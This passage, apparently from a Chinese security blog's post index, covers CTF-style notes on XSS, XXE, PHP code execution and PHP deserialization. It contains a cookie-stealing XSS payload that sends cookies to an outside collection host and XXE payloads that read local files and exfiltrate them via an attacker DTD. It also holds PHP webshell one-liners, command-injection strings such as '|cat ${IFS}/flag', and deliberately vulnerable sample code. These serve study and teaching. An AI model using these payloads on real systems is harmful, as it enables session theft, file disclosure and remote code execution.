上面的代码中，虽然加载的脚本来自当前域名，但是通过改写回调函数，攻击者依然可以执行恶意代码。 例题[CISCN2019 华东北赛区]Web2https://mochu.blog.csdn.net/article/details/105212961 投稿存在XSS，但是存在一些过滤，使用Markup转码，然后eval执行JS代码，并且需要一个window.location.href来自动触发刷新颜面使用题目提供的站内XSS平台 添加windows.location.href，并删去if判断那一段 1(function()&#123;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;xss.buuoj.cn&#x2F;index.php?do&#x3D;api&amp;id&#x3D;arHAGx&amp;location&#x3D;&#39;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)())+&#39;&amp;toplocation&#x3D;&#39;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)())+&#39;&amp;cookie&#x3D;&#39;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)())+&#39;&amp;opener&#x3D;&#39;+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&#39;&#39;&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)());&#125;)(); 然后利用脚本，进行编码绕过，并且执行 123456xss='''(function()&#123;window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=arHAGx&amp;location='+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;toplocation='+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;cookie='+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;opener='+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:''&#125;catch(e)&#123;return ''&#125;&#125;)());&#125;)();'''output = \"\"for c in xss: output += \"&amp;#\" + str(ord(c))print(\"&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34\" + output + \"&amp;#34&amp;#41&lt;/script&gt;\") 参考文章:前端HACK之XSS攻击个人学习笔记 http://www.cnfluffy.com/2019-03-11/4963dom型https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/DOMXSS.md解码顺序 https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F.md Content Security Policy 入门教程","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"xss","slug":"xss","permalink":"https://blog.cfyqy.com/tags/xss/"}],"author":"ye1s"},{"title":"xxe漏洞","slug":"xxe实体注入","date":"2019-03-15T06:02:00.000Z","updated":"2021-04-17T08:25:27.058Z","comments":true,"path":"article/dc7e61bd.html","link":"","permalink":"https://blog.cfyqy.com/article/dc7e61bd.html","excerpt":"XML外部实体攻击是对解析XML输入的应用程序的一种攻击。当包含对外部实体的引用的XML输入由弱配置的XML解析器处理时，会发生此攻击。此攻击可能导致机密数据泄露，拒绝服务，服务器端请求伪造，从解析器所在机器的角度进行端口扫描，以及其他系统影响","text":"XML外部实体攻击是对解析XML输入的应用程序的一种攻击。当包含对外部实体的引用的XML输入由弱配置的XML解析器处理时，会发生此攻击。此攻击可能导致机密数据泄露，拒绝服务，服务器端请求伪造，从解析器所在机器的角度进行端口扫描，以及其他系统影响 基础知识&lt;!ENTITY 实体名称 SYSTEM “URI/URL”&gt;外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示： 练习题练习靶场：https://github.com/c0ny1/xxe-lab phpsimplexml_load_string的函数这个函数是将XML转化为对象 php版本大于5.4.45的默认不解析外部实体 例题：doLogin.php 1234567891011121314151617181920212223242526272829&lt;?php$USERNAME &#x3D; &#39;admin&#39;; &#x2F;&#x2F;账号$PASSWORD &#x3D; &#39;admin&#39;; &#x2F;&#x2F;密码$result &#x3D; null;libxml_disable_entity_loader(false);$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);try&#123; $dom &#x3D; new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds &#x3D; simplexml_import_dom($dom); $username &#x3D; $creds-&gt;username; $password &#x3D; $creds-&gt;password; if($username &#x3D;&#x3D; $USERNAME &amp;&amp; $password &#x3D;&#x3D; $PASSWORD)&#123; $result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,1,$username); &#125;else&#123; $result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,0,$username); &#125; &#125;catch(Exception $e)&#123; $result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,3,$e-&gt;getMessage());&#125;header(&#39;Content-Type: text&#x2F;html; charset&#x3D;utf-8&#39;);echo $result;?&gt; 可以看出，默认的账号密码都是admin这里没有xml文档，所以使用php伪协议(php://input)来接收发送的xml文档后面的if-else条件判断语句用来输出结果，注意必须要有username这个标签，不然的话找不到username,就没有了输出了，我们也不能通过回显来获取信息了。 这里我们构造paylaod，目的是能够输出在username里面 12345&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE mzymzy [&lt;!ENTITY test SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;test;&lt;&#x2F;username&gt;&lt;password&gt;mzymzy&lt;&#x2F;password&gt;&lt;&#x2F;user&gt; 这里关键字‘SYSTEM’，会令xml解析器从URL中读取内容，并允许它在xml文档中被替换。这里我们可以强制xml解析器去访问系统配置文件(位于C盘下的windows/win.ini)这里的test就是指被读取的系统配置文件内容。 用盲注的方法试一下(当无回显的时候可用) 先在自己的服务器中加入下列DTD文件 12 &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;myip&#x2F;?%file;&#39;&gt;&quot;&gt;%start; 然后请求的数据为下面(用php协议将发送的数据编码为base64) 12345678&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;myip&#x2F;xml.dtd&quot;&gt; &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt; %remote; %send;]&gt;&lt;message&gt;1234&lt;&#x2F;message&gt; java1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071package me.gv7.xxe;import java.io.IOException;import java.io.PrintWriter;import javax.servlet.ServletException;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import org.w3c.dom.Document;import org.w3c.dom.NodeList;import org.xml.sax.SAXException;import javax.xml.parsers.*;@WebServlet(\"/doLoginServlet\")public class LoginServlet extends HttpServlet &#123; private static final long serialVersionUID = 1L; private static final String USERNAME = \"admin\";//ÕËºÅ private static final String PASSWORD = \"admin\";//ÃÜÂë protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db; String result=\"\"; try &#123; db = dbf.newDocumentBuilder(); /*ÐÞ¸´´úÂë*/ //dbf.setExpandEntityReferences(false); Document doc = db.parse(request.getInputStream()); String username = getValueByTagName(doc,\"username\"); String password = getValueByTagName(doc,\"password\"); if(username.equals(USERNAME) &amp;&amp; password.equals(PASSWORD))&#123; result = String.format(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;\",1,username); &#125;else&#123; result = String.format(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;\",0,username); &#125; &#125; catch (ParserConfigurationException e) &#123; e.printStackTrace(); result = String.format(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;\",3,e.getMessage()); &#125; catch (SAXException e) &#123; e.printStackTrace(); result = String.format(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;\",3,e.getMessage()); &#125; response.setContentType(\"text/xml;charset=UTF-8\"); response.getWriter().append(result); &#125; protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; doGet(request, response); &#125; /** * * @param doc ÎÄµµ * @param tagName ±êÇ©Ãû * @return ±êÇ©Öµ */ public static String getValueByTagName(Document doc, String tagName)&#123; if(doc == null || tagName.equals(null))&#123; return \"\"; &#125; NodeList pl = doc.getElementsByTagName(tagName); if(pl != null &amp;&amp; pl.getLength() &gt; 0)&#123; return pl.item(0).getTextContent(); &#125; return \"\"; &#125;&#125; python例题 #coding=utf-8 from flask import Flask, request, url_for, render_template, redirect from xml.dom import minidom app = Flask(__name__) app.config['DEBUG'] = True USERNAME = 'admin' # 账号 PASSWORD = 'admin' # 密码 @app.route(\"/\") def home(): return render_template(\"index.html\") @app.route(\"/doLogin\", methods=['POST', 'GET']) def doLogin(): result = None try: DOMTree = minidom.parseString(request.data) username = DOMTree.getElementsByTagName(\"username\") username = username[0].childNodes[0].nodeValue password = DOMTree.getElementsByTagName(\"password\") password = password[0].childNodes[0].nodeValue if username == USERNAME and password == PASSWORD: result = \"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;\" % (1,username) else: result = \"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;\" % (0,username) except Exception,e: result = \"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;\" % (3,e.message) return result,{'Content-Type': 'text/xml;charset=UTF-8'} def prn_obj(obj): print '\\n'.join(['%s:%s' % item for item in obj.__dict__.items()]) if __name__ == \"__main__\": app.run() 参考文章:浅谈XXE漏洞攻击与防御 https://thief.one/2017/06/20/1/XML实体注入漏洞的利用与学习https://uknowsec.cn/posts/notes/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://blog.cfyqy.com/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"xxe","slug":"xxe","permalink":"https://blog.cfyqy.com/tags/xxe/"}],"author":"ye1s"},{"title":"jsonp注入","slug":"onp注入","date":"2019-03-15T00:54:00.000Z","updated":"2020-04-13T08:16:43.054Z","comments":true,"path":"article/3e95ff8f.html","link":"","permalink":"https://blog.cfyqy.com/article/3e95ff8f.html","excerpt":"没接触过，不太懂……","text":"没接触过，不太懂……","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"jsonp注入","slug":"jsonp注入","permalink":"https://blog.cfyqy.com/tags/jsonp%E6%B3%A8%E5%85%A5/"}],"author":"ye1s"},{"title":"代码执行命令执行总结","slug":"代码执行-命令执行总结","date":"2019-03-14T08:14:00.000Z","updated":"2020-06-30T13:46:41.556Z","comments":true,"path":"article/cb17b2aa.html","link":"","permalink":"https://blog.cfyqy.com/article/cb17b2aa.html","excerpt":"代码执行来缺乏严格过滤或者用户控制的数据逃逸。","text":"代码执行来缺乏严格过滤或者用户控制的数据逃逸。 文件操作函数file_put_contents() 函数把一个字符串写入文件中。 fputs() 函数写入文件 代码示例： 12345&lt;?php $test='&lt;?php eval($_POST[cmd]);?&gt;';file_put_contents('test1.php',$test);?&gt;&lt;?php fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[cmd])?&gt;'); 相关函数eval()例题1 1234&lt;?php$str=@(string)$_GET['c'];@eval('$str=\"'.addslashes($str).'\";');?&gt; addslashes() 函数返回在预定义字符之前添加反斜杠的字符串预定义字符是：单引号（’）双引号（”）反斜杠（\\）NULL。默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。PHP6中删除了magic_quotes_gpc这个选项可以用${${}}绕过 1127.0.0.1/test.php?c=$&#123;$&#123;phpinfo()&#125;&#125; 例题 2 12345678&lt;?php$str=\"echo \\\"just\".$_GET['c'].\"a test\\\";\";eval($str);?&gt;test.php?c=$&#123;$&#123;fputs(fopen('shell.php','w+'),'&lt;?php @eval($_POST[c]) ?&gt;')&#125;&#125; preg_replace()mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )搜索subject中匹配pattern的部分， 以replacement进行替换。当$pattern处存在e修饰符时（5.5.0版本/e 修饰符已经被弃用了），$replacement 会被当做php代码执行。例题1： 123456&lt;?php$string = 'April';$pattern = '/\\w+/ie';$replacement = 'phpinfo();';echo preg_replace($pattern, $replacement, $string);?&gt; 例题2： 12345&lt;?php echo preg_replace($_GET[\"a\"],$_GET['b'],$_GET[\"c\"]);?&gt;127.0.0.1/test.php?a=/test/e&amp;b=phpinfo()&amp;c=just a test call_user_func()mixed call_user_func( callable $callbank [ , mixed $parameter [ , mixed $…)第一个参数为回调函数，第二个参数是回调函数的参数 12345&lt;?php$b = \"phpinfo()\";call_user_func($_GET['c'],$b)?&gt;127.0.0.1/test.php?c=assert array_filter()array_filter() 函数用回调函数过滤数组中的值 1234&lt;?phparray_filter(array($_GET['c']),strrev('tressa'));?&gt;http://127.0.0.1/test.php?c=phpinfo(); create_function()在php 中使用create_function()创建一个匿名函数（lambda-style）,如果对参数未进行严格的过滤审查，攻击者可以通过提交特殊字符串给create_function()从而导致任意代码执行 123456&lt;?php$test=$_GET['c'];$newfun=create_function('$a,$b',$test);$newfun(2,1);?&gt;http://127.0.0.1/test.php?c=phpinfo(); assert12345678&lt;?phpassert(trim(\"'\".$_GET['c'].\"'\"));echo \"hello\".htmlentities($_GET['c']);?&gt;127.0.0.1/test.php?c=test'.eval('echo 1;').'127.0.0.1/test.php?c=test'.system('whoami').'127.0.0.1/test.php?c=test'.phpinfo().' 绕过姿势看大佬的文章：https://github.com/CHYbeta/WAF-Bypass/blob/master/ming-ling-zhu-ru/rao-guo-fang-fa.md 正则 12345678&lt;?php $file_name = $_GET[\"path\"]; if(!preg_match(\"/^[/a-zA-Z0-9-s_]+.rpt$/m\", $file_name)) &#123; echo \"regex failed\"; &#125; else &#123; echo exec(\"/usr/bin/file -i -b \" . $file_name); &#125; ?&gt; 具体绕过看此文https://www.anquanke.com/post/id/85698参考文章：PHP Code Injection Analysis 代码执行漏洞总结","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"命令执行","slug":"命令执行","permalink":"https://blog.cfyqy.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"php","slug":"php","permalink":"https://blog.cfyqy.com/tags/php/"},{"name":"代码执行","slug":"代码执行","permalink":"https://blog.cfyqy.com/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"}],"author":"ye1s"},{"title":"php反序列化整理","slug":"p反序列化","date":"2019-03-13T01:10:00.000Z","updated":"2021-01-01T15:05:56.806Z","comments":true,"path":"article/7c19cc12.html","link":"","permalink":"https://blog.cfyqy.com/article/7c19cc12.html","excerpt":"反序列化漏洞主要是反序列化的过程中某些参数可控，传入一些精心构造的字符串，从而控制内部的变量设置函数，执行想要的操作。","text":"反序列化漏洞主要是反序列化的过程中某些参数可控，传入一些精心构造的字符串，从而控制内部的变量设置函数，执行想要的操作。 序列化反序列化常见方法1234567891011__wakeup() //使用unserialize时触发__sleep() //使用serialize时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当脚本尝试将对象调用为函数时触发 序列化PHP 序列化后的内容是简单的文本格式，但是对字母大小写和空白（空格、回车、换行等）敏感，而且字符串是按照字节（或者说是 8 位的字符）计算的，因此，更合适的说法是 PHP 序列化后的内容是字节流格式。因此用其他语言实现时，如果所实现的语言中的字符串不是字节储存格式，而是 Unicode 储存格式的话，序列化后的内容不适合保存为字符串，而应保存为字节流对象或者字节数组，否则在与 PHP 进行数据交换时会产生错误。 php序列化的字母标示及其含义 12345678910111213a - arrayb - booleand - doublei - integero - common objectr - references - stringC - custom objectO - classN - nullR - pointer referenceU - unicode stringN 表示的是 NULL，而 b *NULL 和标量类型的序列化 * NULL 的序列化 1N; boolean 型数据的序列化 1b:&lt;digit&gt;; integer 型数据的序列化 1i:&lt;number&gt;; 其中&lt;number&gt;为一个整型数，范围为：-2147483648 到 2147483647。数字前可以有正负号，如果被序列化的数字超过这个范围，则会被序列化为浮点数类型而不是整型。 double 型数据的序列化 1d:&lt;number&gt;; 其中 为一个浮点数，其范围与 PHP 中浮点数的范围一样。可以表示成整数形式、浮点数形式和科学技术法形式。如果序列化无穷大数，则 为 INF，如果序列化负无穷大，则 为 -INF。序列化后的数字范围超过 PHP 能表示的最大值，则反序列化时返回无穷大（INF），如果序列化后的数字范围超过 PHP 所能表示的最小精度，则反序列化时返回 0。当浮点数为非数时，被序列化为 NAN，NAN 反序列化时返回 0。但其它语言可以将 NAN 反序列化为相应语言所支持的 NaN 表示。 1s:&lt;length&gt;:\"&lt;value&gt;\"; 其中 &lt;length&gt; 是 &lt;value&gt; 的长度，&lt;length&gt;是非负整数，数字前可以带有正号（+）。&lt;value&gt; 为字符串值，这里的每个字符都是单字节字符，其范围与 ASCII 码的 0 - 255 的字符相对应。每个字符都表示原字符含义，没有转义字符，&lt;value&gt; 两边的引号（””）是必须的，但不计算在&lt;length&gt; 当中。这里的 &lt;value&gt;相当于一个字节流，而&lt;length&gt;是这个字节流的字节个数 简单复合类型的序列化 数组的序列化 1a:&lt;n&gt;:&#123;&lt;key 1&gt;&lt;value 1&gt;&lt;key 2&gt;&lt;value 2&gt;...&lt;key n&gt;&lt;value n&gt;&#125; 其中 &lt;n&gt; 表示数组元素的个数，&lt;key 1&gt;、&lt;key 2&gt;……&lt;key n&gt;表示数组下标，&lt;value 1&gt;、&lt;value 2&gt;……&lt;value n&gt; 表示与下标相对应的数组元素的值。 对象的序列化 1O:&lt;length&gt;:\"&lt;class name&gt;\":&lt;n&gt;:&#123;&lt;field name 1&gt;&lt;field value 1&gt;&lt;field name 2&gt;&lt;field value 2&gt;...&lt;field name n&gt;&lt;field value n&gt;&#125; 其中 &lt;length&gt;表示对象的类名 &lt;class name&gt;的字符串长度。&lt;n&gt;表示对象中的字段1个数。这些字段包括在对象所在类及其祖先类中用 var、public、protected和 private 声明的字段，但是不包括 static 和 const 声明的静态字段。也就是说只有实例（instance）字段 对象字段名的序列化var 和 public 声明的字段都是公共字段，因此它们的字段名的序列化格式是相同的。公共字段的字段名按照声明时的字段名进行序列化，但序列化后的字段名中不包括声明时的变量前缀符号 $。 protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上 1\\0*\\0 的前缀。这里的 \\0 表示 ASCII 码为 0 的字符，而不是 \\0 组合。 private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，字段名前面会加上 1\\0&lt;declared class name&gt;\\0 的前缀。这里 表示的是声明该私有字段的类的类名，而不是被序列化的对象的类名。因为声明该私有字段的类不一定是被序列化的对象的类，而有可能是它的祖先类。 字段名被作为字符串序列化时，字符串值中包括根据其可见性所加的前缀。字符串长度也包括所加前缀的长度。其中 \\0 字符也是计算长度的。 嵌套复合类型的序列化 对象引用和指针引用 在 PHP 中，标量类型数据是值传递的，而复合类型数据（对象和数组）是引用传递的。但是复合类型数据的引用传递和用 &amp; 符号明确指定的引用传递是有区别的，前者的引用传递是对象引用，而后者是指针引用PHP 只对对象在序列化时才会生成对象引用标示（r）。对所有的标量类型和数组（也 包括 NULL）序列化时都不会生成对象引用。但是如果明确使用了 &amp; 符号作的引用，在序列化时，会被序列化为指针引用标示（R）。 引用标示后的数字对象引用（r）和指针引用（R）的格式为： 12r:&lt;number&gt;;R:&lt;number&gt; &lt;number&gt; 简单的说，就是所引用的对象在序列化串中第一次出现的位置，但是这个位置不是指字符的位置，而是指对象（这里的对象是泛指所有类型的量，而不仅限于对象类型）的位置。例子： 12345678910111213141516class ClassA &#123; var $int; var $str; var $bool; var $obj; var $pr;&#125; $a = new ClassA();$a-&gt;int = 1;$a-&gt;str = \"Hello\";$a-&gt;bool = false;$a-&gt;obj = $a;$a-&gt;pr = &amp;$a-&gt;str; echo serialize($a); 这个例子的结果是： 1O:6:\"ClassA\":5:&#123;s:3:\"int\";i:1;s:3:\"str\";s:5:\"Hello\";s:4:\"bool\";b:0;s:3:\"obj\";r:1;s:2:\"pr\";R:3;&#125; 在这个例子中，首先序列化的对象是 ClassA 的一个对象，那么给它编号为 1，接下来要序列化的是这个对象的几个成员，第一个被序列化的成员是 int 字段，那它的编号就为 2，接下来被序列化的成员是 str，那它的编号就是 3，依此类推，到了 obj 成员时，它发现该成员已经被序列化了，并且编号为 1，因此它被序列化时，就被序列化成了 r:1; ，在接下来被序列化的是 pr 成员，它发现该成员实际上是指向 str 成员的一个引用，而 str 成员的编号为 3，因此，pr 就被序列化为 R:3; 了。 对象引用的反序列化 绕过魔术方法反序列化漏洞__construct()123456789101112131415161718192021222324252627&lt;?php/** * @Author: yeSi * @Date: 2019-03-13 10:04:17 * @Last Modified by: yeSi * @Last Modified time: 2019-03-13 10:30:47 */class test2&#123; function __construct($test)&#123; $fp = fopen(\"shell.php\",\"w\") ; fwrite($fp,$test); fclose($fp); &#125;&#125;class test1&#123; var $test = '123'; function __wakeup()&#123; $obj = new test2($this-&gt;test); &#125;&#125;$class1 = $_GET['test'];print_r($class1);echo \"&lt;/br&gt;\";$class1_unser = unserialize($class1);require \"shell.php\";?&gt; 这里我们给test传入构造好的序列化字符串后，进行反序列化时自动调用 wakeup()函数，从而在new ph0en1x()会自动调用对象ph0en1x中的construct()方法，从而把写入到 shell.php中 __wakeup()123456789101112131415class yesi&#123; var $test = '123456'; function __wakeup()&#123; $fp = fopen(\"shell.php\",\"w\") ; fwrite($fp,$this-&gt;test); fclose($fp); &#125;&#125;$class1 = $_GET['test'];print_r($class1);echo \"&lt;/br&gt;\";$class3_unser = unserialize($class1);require \"shell.php\";// 为显示效果，把这个shell.php包含进来?&gt; PUGindex.php 12345678910111213141516171819202122232425262728293031&lt;?php error_reporting(0); include 'class.php'; if(is_array($_GET)&amp;&amp;count($_GET)&gt;0) &#123; if(isset($_GET[\"LandIn\"])) &#123; $pos=$_GET[\"LandIn\"]; &#125; if($pos===\"airport\") &#123; die(\"&lt;center&gt;机场大仙太多,你被打死了~&lt;/center&gt;\"); &#125; elseif($pos===\"school\") &#123; echo('&lt;/br&gt;&lt;center&gt;&lt;a href=\"/index.html\" style=\"color:white\"&gt;叫我校霸~~&lt;/a&gt;&lt;/center&gt;'); $pubg=$_GET['pubg']; $p = unserialize($pubg); // $p-&gt;Get_air_drops($p-&gt;weapon,$p-&gt;bag); &#125; elseif($pos===\"AFK\") &#123; die(\"&lt;center&gt;由于你长时间没动,掉到海里淹死了~&lt;/center\"); &#125; else &#123; die(\"&lt;center&gt;You Lose&lt;/center&gt;\"); &#125; &#125;?&gt; class.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?php include 'waf.php'; class sheldon&#123; public $bag=\"nothing\"; public $weapon=\"M24\"; // public function __toString()&#123; // $this-&gt;str=\"You got the airdrop\"; // return $this-&gt;str; // &#125; public function __wakeup() &#123; $this-&gt;bag=\"nothing\"; $this-&gt;weapon=\"kar98K\"; &#125; public function Get_air_drops($b) &#123; $this-&gt;$b(); &#125; public function __call($method,$parameters) &#123; $file = explode(\".\",$method); echo $file[0]; if(file_exists(\".//class$file[0].php\")) &#123; system(\"php .//class//$method.php\"); &#125; else &#123; system(\"php .//class//win.php\"); &#125; die(); &#125; public function nothing() &#123; die(\"&lt;center&gt;You lose&lt;/center&gt;\"); &#125; public function __destruct() &#123; waf($this-&gt;bag); if($this-&gt;weapon==='AWM') &#123; $this-&gt;Get_air_drops($this-&gt;bag); &#125; else &#123; die('&lt;center&gt;The Air Drop is empty,you lose~&lt;/center&gt;'); &#125; &#125; &#125;?&gt; payload 1http://120.78.57.208:6001/?LandIn=school&amp;pubg=O:7:\"sheldon\":3:&#123;s:3:\"bag\";s:27:\"//win.php| cat ./class/flag\";s:6:\"weapon\";s:3:\"AWM\";&#125; 2017百越杯awd1234567891011121314151617181920212223242526272829&lt;?phpclass home&#123; private $method; private $args; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; &#125; function __destruct()&#123; if (in_array($this-&gt;method, array(\"ping\"))) &#123; call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; &#125; function ping($host)&#123; system(\"ping -c 2 $host\"); &#125; function waf($str)&#123; $str=str_replace(' ','',$str); return $str; &#125; function __wakeup()&#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = $this-&gt;waf(trim(mysql_escape_string($v))); &#125; &#125; &#125;$a=@$_POST['a'];@unserialize($a);?&gt; 构造序列化: 123456789&lt;?phpclass home&#123; private $method=\"ping\"; private $args=array('1|cat$&#123;IFS&#125;/flag');&#125;$test=new home();print_r(serialize($test));?&gt; 最后payload 12post:O:4:\"home\":2:&#123;s:12:\"%00home%00method\";s:4:\"ping\";s:10:\"%00home%00args\";a:1:&#123;i:0;s:16:\"1|cat$&#123;IFS&#125;/flag\";&#125;&#125; session反序列化漏洞实际利用参照此链接https://blog.spoock.com/2016/10/16/php-serialize-problem/#%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8 安恒杯中的一题class.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phphighlight_string(file_get_contents(basename($_SERVER['PHP_SELF'])));//show_source(__FILE__);class foo1&#123; public $varr; function __construct()&#123; $this-&gt;varr = \"index.php\"; &#125; function __destruct()&#123; if(file_exists($this-&gt;varr))&#123; echo \"&lt;br&gt;文件\".$this-&gt;varr.\"存在&lt;br&gt;\"; &#125; echo \"&lt;br&gt;这是foo1的析构函数&lt;br&gt;\"; &#125;&#125;class foo2&#123; public $varr; public $obj; function __construct()&#123; $this-&gt;varr = '1234567890'; $this-&gt;obj = null; &#125; function __toString()&#123; $this-&gt;obj-&gt;execute(); return $this-&gt;varr; &#125; function __desctuct()&#123; echo \"&lt;br&gt;这是foo2的析构函数&lt;br&gt;\"; &#125;&#125;class foo3&#123; public $varr; function execute()&#123; eval($this-&gt;varr); &#125; function __desctuct()&#123; echo \"&lt;br&gt;这是foo3的析构函数&lt;br&gt;\"; &#125;&#125;? index.php 12345678910111213&lt;?phpini_set('session.serialize_handler', 'php');require(\"./class.php\");session_start();$obj = new foo1();$obj-&gt;varr = \"phpinfo.php\";?&gt; 参照此链接：http://blog.nuptzj.cn/post/105或者https://blog.spoock.com/2016/10/16/php-serialize-problem/#CTF oj一题1234567891011121314151617181920212223242526&lt;?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = 'phpinfo();'; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET['phpinfo']))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents('index.php'));&#125;?&gt; 解法upload.html 12345&lt;form action=\"index.php\" method=\"POST\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" /&gt; &lt;input type=\"file\" name=\"file\" /&gt; &lt;input type=\"submit\" /&gt;&lt;/form&gt; answer.php 1234567891011121314151617181920212223&lt;?php/** * @Author: yeSi * @Date: 2019-03-13 14:50:08 * @Last Modified by: yeSi * @Last Modified time: 2019-03-13 17:41:13 */class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = 'phpinfo();'; &#125;&#125;$test=new OowoO();$test-&gt;mdzz=\"print_r(scandir(dirname(__FILE__)));\";print_r(\"|\".serialize($test));?&gt; 查看根目录查看文件读取文件 phar反序列化漏洞生成yesi.phar 12345678910111213141516&lt;?php class not_useful&#123; var $file = \"&lt;?php phpinfo() 